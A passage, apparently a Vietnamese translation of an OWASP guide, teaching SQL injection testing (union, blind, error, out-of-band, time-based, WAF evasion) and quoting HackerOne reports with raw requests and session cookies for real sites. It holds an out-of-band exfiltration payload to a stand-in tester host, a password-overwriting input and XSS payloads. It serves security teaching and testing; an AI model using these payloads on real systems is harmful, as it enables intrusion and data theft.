
Theo cách này chúng ta có request như sau:
```
http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&password=foo 
```

Example 2 (simple SELECT statement):

Quan sát câu query bên dưới:
```
SELECT * FROM products WHERE id_product=$id_product
```

Quan sát request khi thực thi câu query bên trên:
```
http://www.example.com/product.php?id=10
```

Khi tester thử một vài giá trị hợp lệ (ví dụ 10 giá trị), ứng dụng sẽ trả về thông tin của sản phẩm. Một cách rất hay để test liệu ứng dụng có tồn lại lỗ hổng hay không trong kịch bản này là sử dụng logic bằng những toán tử như AND và OR

Quan sát request:
```
http://www.example.com/product.php?id=10 AND 1=2
```
```
SELECT * FROM products WHERE id_product=10 AND 1=2
```

Trong trường hợp này, có thể ứng dụng sẻ trả về một vài thông báo nói với chúng ta rằng không có content hợp lệ hoặc một page trắng. Sau đó tester có thể gửi câu truy vấn đúng kiểm tra liệu có kết quả hợp lệ trả về không:
```
http://www.example.com/product.php?id=10 AND 1=1
```

Example 3 (Stacked queries):

Dựa trên API, cái mà ứng dụng web đang sử dụng với DBMS (ví dụ: PHP + PostgreSQL, ASP+SQL SERVER) nó có thể thực hiện đa truy vấn trong một lần gọi.

Quan sát câu truy vấn SQL bên dưới:
```
SELECT * FROM products WHERE id_product=$id_product
```

Một cách để khai thác kịch bản bên trên sẽ là:
```
http://www.example.com/product.php?id=10; INSERT INTO users (…)
```

Cách này có thể thực thi nhiều câu truy vấn trong 1 hàng và độc lập với câu query thứ nhất.


*Fingerprinting the Database:*

Mặc dù ngôn ngữ SQL là một tiêu chuẩn, nhưng mỗi DBMS đều có tính đặc thù và khác nhau ở nhiều khía cạnh như các lệnh đặc biệt, chức năng truy xuất dữ liệu như tên người dùng và cơ sở dữ liệu, tính năng, dòng nhận xét, v.v.

Khi tester chuyển sang khai thác SQL injection nâng cao hơn, họ cần biết cơ sở dữ liệu backend là gì.

1. Cách đầu tiên để tìm ra cơ sở dữ liệu phía sau nào được sử dụng là quan sát lỗi do ứng dụng trả về. Sau đây là một số ví dụ về thông báo lỗi:

    MySql:
    ```
    You have an error in your SQL syntax; check the manual
    that corresponds to your MySQL server version for the
    right syntax to use near '\'' at line 1
    ```
    Một UNION SELECT hoàn chỉnh với version() cũng có thể giúp biết cơ sở dữ liệu phía sau.
    ```
    SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1
    ```

    Oracle:
    ```
    ORA-00933: SQL command not properly ended
    ```

    MS SQL Server:
    ```
    Microsoft SQL Native Client error ‘80040e14’
    Unclosed quotation mark after the character string
    ```
    ```
    SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
    ```

    PostgreSQL:
    ```
    Query failed: ERROR: syntax error at or near
    "’" at character 56 in /www/site/test.php on line 121.
    ```

2. Nếu không có thông báo lỗi hoặc thông báo lỗi tùy chỉnh, người kiểm tra có thể thử đưa vào các trường chuỗi bằng các kỹ thuật nối khác nhau:

    ```
    --------------------------------
    MySql       :      'test' + 'ing'
    SQL Server  :      'test' 'ing'
    Oracle      :      'test'||'ing'
    PostgreSQL  :      'test'||'ing'
    ```


*Exploitation Techniques:*

Union Exploitation Technique:

Toán tử UNION được sử dụng trong các lần tiêm SQL để tham gia một truy vấn, do tester cố ý giả mạo, với truy vấn ban đầu. Kết quả của truy vấn giả mạo sẽ được nối với kết quả của truy vấn ban đầu, cho phép người kiểm tra thu được giá trị của các cột trong các bảng khác. Giả sử đối với các ví dụ của chúng tôi rằng truy vấn được thực thi từ máy chủ như sau:

SELECT Name, Phone, Address FROM Users WHERE Id=$id

Chúng tôi sẽ đặt giá trị $id sau:
```
$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

Chúng ta sẽ có câu truy vấn sau:
```
SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
```

Cái này sẽ kết hợp kết quả của truy vấn ban đầu với tất cả các số thẻ tín dụng trong bảng CreditCardTable. Từ khóa ALL là cần thiết để giải quyết các truy vấn sử dụng từ khóa DISTINCT. Hơn nữa, chúng tôi nhận thấy rằng ngoài số thẻ tín dụng, chúng tôi đã chọn hai giá trị khác. Hai giá trị này là cần thiết vì hai truy vấn phải có số tham số/cột bằng nhau để tránh lỗi cú pháp.

Chi tiết đầu tiên mà tester cần để khai thác lỗ hổng SQL injection bằng kỹ thuật như vậy là tìm đúng số cột trong câu lệnh SELECT.

Để đạt được điều này, tester có thể sử dụng mệnh đề ORDER BY theo sau là một số cho biết số lượng cột của cơ sở dữ liệu được chọn:
```
http://www.example.com/product.php?id=10 ORDER BY 10--
```

Nếu truy vấn thực thi thành công, người kiểm tra có thể giả sử, trong ví dụ này, có 10 cột trở lên trong câu lệnh CHỌN. Nếu truy vấn không thành công thì phải có ít hơn 10 cột được truy vấn trả về. Nếu có một thông báo lỗi, nó có thể là:
```
Unknown column '10' in 'order clause'
```

Sau khi người kiểm tra tìm ra số cột, bước tiếp theo là tìm ra loại cột. Giả sử có 3 cột trong ví dụ trên, người kiểm tra có thể thử từng loại cột, sử dụng giá trị NULL để giúp họ:

```
http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--
```

Nếu truy vấn không thành công, người kiểm tra có thể sẽ thấy một thông báo như:
```
All cells in a column must have the same datatype
```

Nếu truy vấn thực hiện thành công, cột đầu tiên có thể là một số nguyên. Sau đó, người thử nghiệm có thể di chuyển xa hơn và cứ thế:
```
http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--
```

Sau khi thu thập thông tin thành công, tùy thuộc vào ứng dụng, nó có thể chỉ hiển thị cho người kiểm tra kết quả đầu tiên, vì ứng dụng chỉ xử lý dòng đầu tiên của tập kết quả. Trong trường hợp này, có thể sử dụng mệnh đề LIMIT hoặc người kiểm tra có thể đặt giá trị không hợp lệ, khiến chỉ truy vấn thứ hai hợp lệ (giả sử không có mục nào trong cơ sở dữ liệu có ID là 99999):
```
http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--
```

Boolean Exploitation Technique

Kỹ thuật khai thác Boolean rất hữu ích khi người kiểm tra tìm thấy một tình huống Blind SQL Injection, trong đó không có gì được biết về kết quả của một hoạt động. Ví dụ: hành vi này xảy ra trong trường hợp lập trình viên đã tạo một trang lỗi tùy chỉnh không tiết lộ bất kỳ điều gì trên cấu trúc của truy vấn hoặc trên cơ sở dữ liệu. (Trang không trả về lỗi SQL, nó chỉ có thể trả về HTTP 500, 404 hoặc chuyển hướng).

Bằng cách sử dụng các phương pháp suy luận, có thể tránh được trở ngại này và do đó thành công trong việc khôi phục các giá trị của một số trường mong muốn. Phương pháp này bao gồm thực hiện một loạt các truy vấn boolean đối với máy chủ, quan sát các câu trả lời và cuối cùng suy ra ý nghĩa của các câu trả lời đó. Như mọi khi, chúng tôi xem xét miền www.example.com và chúng tôi cho rằng miền này chứa tham số có tên là id dễ bị tấn công bằng SQL injection. Điều này có nghĩa là thực hiện yêu cầu sau:
```
http://www.example.com/index.php?id=1'
```

Chúng tôi sẽ nhận được một trang có lỗi thông báo tùy chỉnh do lỗi cú pháp trong truy vấn. Chúng tôi cho rằng truy vấn được thực hiện trên máy chủ là:
```
SELECT field1, field2, field3 FROM Users WHERE Id='$Id' 
```

Có thể khai thác thông qua các phương pháp đã thấy trước đây. Những gì chúng tôi muốn lấy là các giá trị của trường tên người dùng. Các thử nghiệm mà chúng tôi sẽ thực hiện sẽ cho phép chúng tôi lấy giá trị của trường tên người dùng, trích xuất giá trị đó theo từng ký tự. Điều này có thể thực hiện được thông qua việc sử dụng một số chức năng tiêu chuẩn, hiện diện trong thực tế mọi cơ sở dữ liệu. Đối với các ví dụ của chúng tôi, chúng tôi sẽ sử dụng các hàm giả sau:

**SUBSTRING(text, start, length):** trả về một chuỗi con bắt đầu từ vị trí "start" của văn bản và có độ dài "length". Nếu "start" lớn hơn độ dài của văn bản, hàm sẽ trả về giá trị null.

**ASCII (char):** nó trả về giá trị ASCII của ký tự đầu vào. Giá trị null được trả về nếu char bằng 0.

**LENGTH (text):** trả về số lượng ký tự trong văn bản đầu vào.

Thông qua các chức năng như vậy, chúng tôi sẽ thực hiện các thử nghiệm của mình trên ký tự đầu tiên và khi chúng tôi phát hiện ra giá trị, chúng tôi sẽ chuyển sang ký tự thứ hai, v.v., cho đến khi chúng tôi phát hiện ra toàn bộ giá trị. Các bài kiểm tra sẽ tận dụng chức năng SUBSTRING, để chỉ chọn một ký tự tại một thời điểm (chọn một ký tự đơn lẻ có nghĩa là áp đặt tham số độ dài thành 1) và chức năng ASCII, để lấy giá trị ASCII, để chúng ta có thể làm so sánh số. Kết quả so sánh sẽ được thực hiện với tất cả các giá trị của bảng ASCII, cho đến khi tìm được giá trị phù hợp. Ví dụ: chúng tôi sẽ sử dụng giá trị sau cho Id:
```
$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1 
```

Điều đó tạo ra truy vấn sau (từ bây giờ, chúng tôi sẽ gọi nó là "truy vấn suy luận"):
```
SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'
```

Ví dụ trước trả về kết quả khi và chỉ khi ký tự đầu tiên của tên người dùng trường bằng giá trị ASCII 97. Nếu chúng tôi nhận được giá trị sai, thì chúng tôi tăng chỉ mục của bảng ASCII từ 97 lên 98 và chúng tôi lặp lại yêu cầu . Thay vào đó, nếu chúng tôi nhận được một giá trị thực, chúng tôi đặt chỉ mục của bảng ASCII thành 0 và chúng tôi phân tích ký tự tiếp theo, sửa đổi các tham số của hàm SUBSTRING. Vấn đề là hiểu theo cách nào chúng ta có thể phân biệt các bài kiểm tra trả về giá trị thực với các bài kiểm tra trả về giá trị sai. Để làm điều này, chúng tôi tạo một truy vấn luôn trả về false. Điều này có thể thực hiện được bằng cách sử dụng giá trị sau cho Id:
```
$Id=1' AND '1' = '2 
```

Cái nào sẽ tạo truy vấn sau:
```
SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2' 
```

Phản hồi thu được từ máy chủ (đó là mã HTML) sẽ là giá trị sai cho các thử nghiệm của chúng tôi. Điều này đủ để xác minh xem giá trị thu được từ việc thực hiện truy vấn suy luận có bằng với giá trị thu được với thử nghiệm được thực hiện trước đó hay không. Đôi khi, phương pháp này không hoạt động. Nếu máy chủ trả về hai trang khác nhau do hai yêu cầu web liên tiếp giống hệt nhau, chúng tôi sẽ không thể phân biệt giá trị thực với giá trị sai. Trong những trường hợp cụ thể này, cần phải sử dụng các bộ lọc cụ thể cho phép chúng tôi loại bỏ mã thay đổi giữa hai yêu cầu và để lấy mẫu. Sau này, đối với mỗi yêu cầu suy luận được thực thi, chúng tôi sẽ trích xuất mẫu tương đối từ phản hồi bằng cách sử dụng cùng chức năng và chúng tôi sẽ thực hiện kiểm soát giữa hai mẫu để quyết định kết quả của thử nghiệm.

Trong phần thảo luận trước, chúng ta chưa giải quyết vấn đề xác định điều kiện kết thúc cho các phép thử out, nghĩa là khi nào chúng ta nên kết thúc thủ tục suy diễn. Một kỹ thuật để thực hiện điều này sử dụng một đặc tính của hàm SUBSTRING và hàm LENGTH. Khi kiểm tra so sánh ký tự hiện tại với mã ASCII 0 (nghĩa là giá trị null) và kiểm tra trả về giá trị true, thì hoặc chúng tôi đã hoàn thành quy trình suy luận (chúng tôi đã quét toàn bộ chuỗi) hoặc giá trị chúng tôi có được phân tích chứa ký tự null.

Chúng tôi sẽ chèn giá trị sau cho trường Id:
```
$Id=1' AND LENGTH(username)=N AND '1' = '1 
```

Trong đó N là số ký tự mà chúng tôi đã phân tích cho đến bây giờ (không tính giá trị null). Truy vấn sẽ là:
```
SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1' 
```

Truy vấn trả về đúng hoặc sai. Nếu chúng tôi có được giá trị đúng, thì chúng tôi đã hoàn thành suy luận và do đó, chúng tôi biết giá trị của tham số. Nếu chúng tôi nhận được sai, điều này có nghĩa là ký tự null có trong giá trị của tham số và chúng tôi phải tiếp tục phân tích tham số tiếp theo cho đến khi chúng tôi tìm thấy một giá trị null khác.

Tấn công SQL injection mù quáng cần một khối lượng truy vấn lớn. Người kiểm tra có thể cần một công cụ tự động để khai thác lỗ hổng.



Error based Exploitation technique

Kỹ thuật khai thác dựa trên lỗi rất hữu ích khi người kiểm tra vì lý do nào đó không thể khai thác lỗ hổng SQL injection bằng kỹ thuật khác như UNION. Kỹ thuật dựa trên Lỗi bao gồm việc buộc cơ sở dữ liệu thực hiện một số thao tác trong đó kết quả sẽ là lỗi. Vấn đề ở đây là cố gắng trích xuất một số dữ liệu từ cơ sở dữ liệu và hiển thị nó trong thông báo lỗi. Kỹ thuật khai thác này có thể khác nhau giữa DBMS với DBMS (kiểm tra phần cụ thể của DBMS).

Quan sát câu query dưới đây:
```
SELECT * FROM products WHERE id_product=$id_product
```

Quan sát request khi thực thi query trên:
```
http://www.example.com/product.php?id=10
```

Request độc hại có thể là (ví dụ: Oracl 10g):
```
http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
```

Trong ví dụ này, tester đang nối giá trị 10 với kết quả của hàm `UTL_INADDR.GET_HOST_NAME`. Hàm này của Oracle sẽ cố gắng trả về tên máy chủ của tham số được truyền cho nó, đó là truy vấn khác, tên của người dùng. Khi cơ sở dữ liệu tìm tên máy chủ với tên cơ sở dữ liệu người dùng, nó sẽ không thành công và trả về thông báo lỗi như:
```
ORA-292257: host SCOTT unknown
```

Sau đó, người kiểm tra có thể thao tác với tham số được truyền cho hàm GET_HOST_NAME() và kết quả sẽ được hiển thị trong thông báo lỗi.



Out of band Exploitation technique

Kỹ thuật này rất hữu ích khi người kiểm tra tìm thấy một tình huống Blind SQL Injection, trong đó không có gì được biết về kết quả của một thao tác. Kỹ thuật này bao gồm việc sử dụng các chức năng DBMS để thực hiện kết nối ngoài băng tần và cung cấp kết quả của truy vấn được đưa vào như một phần của yêu cầu tới máy chủ của người kiểm tra. Giống như các kỹ thuật dựa trên lỗi, mỗi DBMS có các chức năng riêng của nó. Kiểm tra phần DBMS cụ thể.

Quan sát câu query bên dưới:
```
SELECT * FROM products WHERE id_product=$id_product
```

Quan sát request khi thực hiện câu query trên:
```
http://www.example.com/product.php?id=10
```

Request độc hại có thể là:
```
http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--
```

Trong ví dụ này, trình kiểm tra đang nối giá trị 10 với kết quả của hàm UTL_HTTP.request. Chức năng này của Oracle sẽ cố gắng kết nối với `testerserver` và tạo một yêu cầu HTTP GET chứa kết quả trả về từ truy vấn “SELECT user FROM DUAL”. Người thử nghiệm có thể thiết lập máy chủ web (ví dụ: Apache) hoặc sử dụng công cụ Netcat:
```
/home/tester/nc –nLp 80
 
GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```



Time delay Exploitation technique

Kỹ thuật khai thác độ trễ thời gian rất hữu ích khi người kiểm tra tìm thấy tình huống Blind SQL Injection, trong đó không có gì được biết về kết quả của một thao tác. Kỹ thuật này bao gồm việc gửi một truy vấn được đưa vào và trong trường hợp điều kiện là đúng, người kiểm tra có thể theo dõi thời gian cần thiết để máy chủ phản hồi. Nếu có độ trễ, người kiểm tra có thể cho rằng kết quả của truy vấn có điều kiện là đúng. Kỹ thuật khai thác này có thể khác nhau giữa DBMS với DBMS (kiểm tra phần cụ thể của DBMS).

Hãy xem xét truy vấn SQL sau:
```
SELECT * FROM products WHERE id_product=$id_product
```

Quan sát request khi thực hiện câu query trên:
```
http://www.example.com/product.php?id=10
```

Request độc hại có thể là (ví dụ: MySql 5.x):
```
http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--
```

Trong ví dụ này, người kiểm tra đang kiểm tra xem phiên bản MySql có phải là 5.x hay không, khiến máy chủ trì hoãn câu trả lời trong 10 giây. Người kiểm tra có thể tăng thời gian trễ và theo dõi phản hồi. Người thử nghiệm cũng không cần đợi phản hồi. Đôi khi anh ta có thể đặt một giá trị rất cao (ví dụ: 100) và hủy yêu cầu sau vài giây.



Stored Procedure Injection

Khi sử dụng SQL động trong một thủ tục được lưu trữ, ứng dụng phải làm sạch đúng cách đầu vào của người dùng để loại bỏ nguy cơ chèn mã. Nếu không được làm sạch, người dùng có thể nhập SQL độc hại sẽ được thực thi trong quy trình được lưu trữ.

Xem xét Stored Procedure Injection sau:
```
Create procedure user_login @username varchar(20), @passwd varchar(20) 
As
Declare @sqlstring varchar(250)
Set @sqlstring  = ‘
Select 1 from users
Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
exec(@sqlstring)
Go
```

User input:
```
1 from users; update users set password = 'password'; select *
```

Automated Exploitation

Hầu hết các tình huống và kỹ thuật được trình bày ở đây có thể được thực hiện một cách tự động bằng cách sử dụng một số công cụ. Trong bài viết này, người kiểm tra có thể tìm thấy thông tin về cách thực hiện kiểm tra tự động bằng [SQLMap](
https://www.owasp.org/index.php/Automated_Audit_using_SQLMap):

*SQL Injection signature Evasion Techniques*

Các kỹ thuật này được sử dụng để vượt qua các biện pháp phòng thủ như tường lửa ứng dụng Web (WAF) hoặc hệ thống ngăn chặn xâm nhập (IPS). Đồng thời tham khảo https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF

**White Space**

Bỏ khoảng trắng hoặc thêm khoảng trắng sẽ không ảnh hưởng đến câu lệnh SQL. Ví dụ
```
or 'a'='a' 
```
```
 or 'a'  =    'a' 
```

Thêm ký tự đặc biệt như dòng hoặc tab mới sẽ không thay đổi cách thực thi câu lệnh SQL. Ví dụ,
```
 
or 
'a'=
      'a' 
```

**Null Bytes**

Sử dụng byte rỗng (%00) trước bất kỳ ký tự nào mà bộ lọc đang chặn.

Ví dụ: nếu kẻ tấn công có thể tiêm SQL sau
```
' UNION SELECT password FROM Users WHERE username='admin'--
```
để thêm Null Byte sẽ là
```
%00' UNION SELECT password FROM Users WHERE username='admin'--
```

**SQL Comments**

Thêm nhận xét nội tuyến SQL cũng có thể giúp câu lệnh SQL hợp lệ và bỏ qua bộ lọc chèn SQL. Lấy ví dụ SQL injection này.
```
' UNION SELECT password FROM Users WHERE name='admin'--
```
Thêm comment inline SQL sẽ được.
```
'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--
```
```
'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--
```

**URL Encoding**

Sử dụng [mã hóa URL trực tuyến](
http://meyerweb.com/eric/tools/dencoder/) để mã hóa câu lệnh SQL
```
' UNION SELECT password FROM Users WHERE name='admin'--
```
Mã hóa URL của câu lệnh SQL injection sẽ là
```
%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--
```

**Character Encoding**

Hàm char() có thể được sử dụng để thay thế English char. Ví dụ: char(114,111,111,116) có nghĩa là root
```
' UNION SELECT password FROM Users WHERE name='root'--
```
Để áp dụng Char(), câu lệnh SQL injection sẽ là:
```
' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--
``` 

**String Concatenation**

Phép nối phá vỡ các từ khóa SQL và trốn tránh các bộ lọc. Cú pháp nối khác nhau dựa trên công cụ cơ sở dữ liệu. Lấy công cụ MS SQL làm ví dụ:
```
select 1
```
Câu lệnh SQL đơn giản có thể được thay đổi như bên dưới bằng cách sử dụng phép nối
```
EXEC('SEL' + 'ECT 1')
```

**Hex Encoding**

Kỹ thuật mã hóa hex sử dụng mã hóa thập lục phân để thay thế ký tự câu lệnh SQL gốc. Ví dụ: 'root' có thể được biểu diễn dưới dạng 726F6F74
```
Select user from users where name = 'root'
```
Câu lệnh SQL bằng cách sử dụng giá trị HEX sẽ là:
```
Select user from users where name = 726F6F74
```
hoặc
```
Select user from users where name = unhex('726F6F74')
```

**Declare variables**

Khai báo câu lệnh SQL injection thành biến và thực thi nó.

Ví dụ: câu lệnh SQL injection bên dưới
```
Union Select password
```
Định nghĩa câu lệnh SQL thành biến SQLivar
```
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password'); 
EXEC(@SQLivar) 
```

**Biểu thức thay thế của 'or 1 = 1'**

- OR 'SQLi' = 'SQL'+'i'
- OR 'SQLi' > 'S'
- or 20 > 1
- OR 2 between 3 and 1
- OR 'SQLi' = N'SQLi'
- 1 and 1 = 1
- 1 || 1 = 1
- 1 && 1 = 1

##### Example report

    Union based

Link to report: https://hackerone.com/reports/1046084

**Summary:**

Xin chào,
Tôi đã tìm thấy SQL Injection Union Based `https://intensedebate.com/commenthistory/$YourSiteId`
`$YourSiteId` vào url dễ bị SQL Injection.

**Steps to reproduce:**

1. Đăng nhập vào `https://intensedebate.com`
2. Sau khi tạo trang web của riêng bạn trên `https://intensedebate.com/install` và làm theo tất cả các bước
3. Bây giờ bạn cần biết id trang web của mình, để có được thì bạn cần truy cập `https://intensedebate.com/user-dashboard` và bạn có thể thấy ở phía bên phải của trang, danh sách trang web của bạn, chọn trang web của bạn và nhấp vào liên kết `Over view`.
Bạn sẽ được chuyển hướng đến `https://intensedebate.com/dash/$YourSiteId`.
Bây giờ bạn đã có id trang web của mình, hãy truy cập URL dễ bị tổn thương với id trang web của bạn `https://intensedebate.com/commenthistory/$YourSiteId`.
Bây giờ Kích hoạt SQL Injection bằng liên kết sau `https://intensedebate.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23` (!) Bạn cần thực hiện việc này với id trang web của riêng mình (!)
Bây giờ bạn có thể thấy `10.1.32-MariaDB` trên trang.

**POC:**

![](img/4-8/sqliPoc.gif)

**Impact:**
Toàn quyền truy cập cơ sở dữ liệu chứa thông tin người dùng riêng tư và Reflected XSS


    Error based

Link to report: https://hackerone.com/reports/761304

**Summary:**

Xin chào, một trong các tham số trong cookie dễ bị tấn công bởi SQL injection. Request bên dưới có tham số `lang` trong cookie. Nếu bạn chèn một dấu ngoặc đơn như `'`. Bạn gặp lỗi SQL syntax. Bằng cách inject thêm 1 dấu `'`, bạn đã loại bỏ lỗi.

**Step to reproduce:**

Tôi đã không cố gắng lọc dữ liệu vì đây là dấu hiệu rõ ràng của SQLi.

```
 
GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
Host: mtn.com.ye
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=en'; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1
Upgrade-Insecure-Requests: 1
 
```

**POC:**

![](img/4-8/SQLi.png)

Tôi xin phép được khai thác thêm vấn đề này.

```
GET /index.php/search/default?t=1&x=0&y=0 HTTP/1.1
Host: mtn.com.ye
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=86ce3d04baa357ffcacf5d013679b696; lang=ens4tgl%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ecyfn9; _ga=GA1.3.1859249834.1576704214; _gid=GA1.3.1031541111.1576704214; _gat=1; _gat_UA-44336198-10=1
Upgrade-Insecure-Requests: 1
```

![](img/4-8/XSS.png)

**Impact:**

Ứng dụng web dễ bị SQL injection, cho phép truy cập dữ liệu



    Boolean based

Link to report: https://hackerone.com/reports/301257

**Summary:**

@gerben_javado nhận thấy rằng tham số `brids` (là một mảng JSON) dễ bị tấn công bởi SQL boolean.

**Step to reproduce:**

```
 
POST /████.php?res_id={RES_ID} HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
Accept: */*
Accept-Language: nl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID={SESSION_COOKIE};
Content-Type: application/x-www-form-urlencoded
Content-Length: 102

action=show_support_breakups&brids=["')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23"]
 
```

**POC:**

Request `MID(0x352e362e33332d6c6f67,1,1)//LIKE//5` (hex == @@version) dẫn đến status code 500 HTTP và `MID(0x352e362e33332d6c6f67,1,1)//LIKE//4` dẫn đến status code 200 HTTP . Cho thấy rằng phiên bản MySQL bắt đầu bằng 5.

**Impact:**

Ứng dụng web bị SQL injection, cho phép truy cập dữ liệu




    Time based

Link to report: https://hackerone.com/reports/1044698

**Summary:**

Xin chào,
Tôi đã tìm thấy Time based SQL Injection `/js/commentAction/`.
Khi người dùng muốn gửi/trả lời comment, payload JSON được gửi theo yêu cầu GET.

```
 
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(15)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: /
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
 
```

```
HTTP Response `15 414 millis`
```

```
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(7)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: /
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
```

```
HTTP Response `7 660 millis`

Bonus :  the  key`"src":0` is vulnerable to self-XSS, change the value by `"<iframe%20src=%23%20onload=alert('XSS')>"` and you will see a XSS pop-up
```

**POC:**
Time based SQL Injection

![](img/4-8/POC.gif)

XSS

![](img/4-8/Self-XSS.gif)

**Impact:**

Có đầy đủ quyền truy cập cơ sở dữ liệu chứa thông tin riêng tư của người dùng.

   